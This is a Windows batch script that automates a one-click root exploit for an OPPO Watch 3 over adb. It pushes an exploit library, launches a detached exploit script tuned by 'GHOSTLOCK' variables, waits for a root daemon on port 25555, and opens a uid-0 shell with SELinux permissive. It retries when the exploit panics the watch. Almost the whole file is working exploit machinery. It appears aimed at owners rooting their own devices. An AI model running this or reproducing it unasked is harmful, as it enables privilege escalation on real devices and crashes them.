@echo off
rem ============================================================================
rem  root_auto.bat -- one-click root for the OPPO Watch 3 (OWW212, A.142).
rem
rem  What it does, in order:
rem    1. waits for the watch over adb
rem    2. pushes exploit\preload.so under a FRESH name (a crash can poison an old
rem       /data/local/tmp name so even `rm` fails on it, so every run picks %RANDOM%)
rem    3. fires the one-boot UW program, detached ON THE DEVICE (nohup ... &) so it
rem       survives this script and the adb client going away
rem    4. waits for "UW-SHELL listening" / a live root daemon on 127.0.0.1:25555
rem    5. opens an interactive root shell (rootdev.ps1)
rem  It retries by itself: roughly one fire in three panics the watch in the walk,
rem  the watch reboots in about a minute and the next attempt usually lands.
rem
rem  Nothing is flashed and the bootloader stays locked; root lasts until reboot.
rem ============================================================================
setlocal enabledelayedexpansion
set DIR=%~dp0
set DT=/data/local/tmp
set PORT=25555
set MAXTRIES=5
set TRIES=0
set ADB=C:\platform-tools\adb.exe
if not exist "%ADB%" set ADB=adb

echo == GhostLock-OWW212 auto root ==
echo adb: %ADB%

:attempt
set /a TRIES+=1
if %TRIES% gtr %MAXTRIES% (
  echo giving up after %MAXTRIES% attempts -- check captures\batroot.log
  exit /b 1
)
echo.
echo [try %TRIES%] waiting for the device ...
set /a W=0
:waitdev
"%ADB%" get-state >nul 2>&1
if not errorlevel 1 goto device_up
set /a W+=5
if %W% geq 300 ( echo no device for 5 minutes; is the watch booting or unplugged? & exit /b 1 )
timeout /t 5 /nobreak >nul
goto waitdev

:device_up
set /a B=0
:waitboot
for /f "usebackq tokens=*" %%v in (`"%ADB%" shell getprop sys.boot_completed 2^>nul`) do set BC=%%v
if "!BC:~0,1!"=="1" goto booted
set /a B+=4
if %B% geq 240 ( echo device online but never finished booting & exit /b 1 )
timeout /t 4 /nobreak >nul
goto waitboot

:booted
set N=%RANDOM%
set SO=%DT%/gs%N%.so
echo [try %TRIES%] device is up, pushing exploit as gs%N%.so
"%ADB%" push "%DIR%exploit\preload.so" %SO% >nul 2>&1
if errorlevel 1 (
  echo   push failed -- the target name may be poisoned, trying another
  timeout /t 5 /nobreak >nul
  goto attempt
)
"%ADB%" push "%DIR%fire3.sh" %DT%/fire3.sh >nul 2>&1
"%ADB%" shell "chmod 755 %DT%/fire3.sh; rm -f %DT%/log_*.txt %DT%/gs%N%.so.out; sync" >nul 2>&1

echo [try %TRIES%] firing the UW program (detached on the device)
start "" /b "%ADB%" shell "nohup GFSO=%SO% GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=40 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh %DT%/fire3.sh >/dev/null 2>&1 &"

echo [try %TRIES%] waiting for the root daemon ...
set /a S=0
:poll
"%ADB%" shell "cat %DT%/log_*.txt 2>/dev/null" > "%DIR%captures\batroot.log" 2>nul
findstr /C:"UW-SHELL listening" "%DIR%captures\batroot.log" >nul 2>&1 && goto rooted
findstr /C:"exploit finished" "%DIR%captures\batroot.log" | findstr /C:"root=YES" >nul 2>&1 && goto rooted
set /a S+=3
if %S% geq 150 (
  echo   no root in this attempt; log tail:
  powershell -NoProfile -Command "Get-Content -Tail 6 '%DIR%captures\batroot.log'"
  goto attempt
)
timeout /t 3 /nobreak >nul
goto poll

:rooted
"%ADB%" forward tcp:%PORT% tcp:%PORT% >nul 2>&1
echo.
echo   ROOTED  --  uid=0 via the daemon on 127.0.0.1:%PORT%  (SELinux permissive)
for /f "usebackq tokens=*" %%i in (`powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%rootdev.ps1" -Cmd "id"`) do echo   %%i
for /f "usebackq tokens=*" %%i in (`powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%rootdev.ps1" -Cmd "getenforce"`) do echo   %%i
echo.
echo   keep this window open if you want the interactive shell; the root daemon
echo   lives on its own, so you can also re-enter later with:
echo       powershell -ExecutionPolicy Bypass -File "%DIR%rootdev.ps1"
echo   do NOT kill the uid-0 toybox process on the watch (its exit is what panics
echo   it); to reset everything just:  %ADB% reboot
echo.
powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%rootdev.ps1"
endlocal
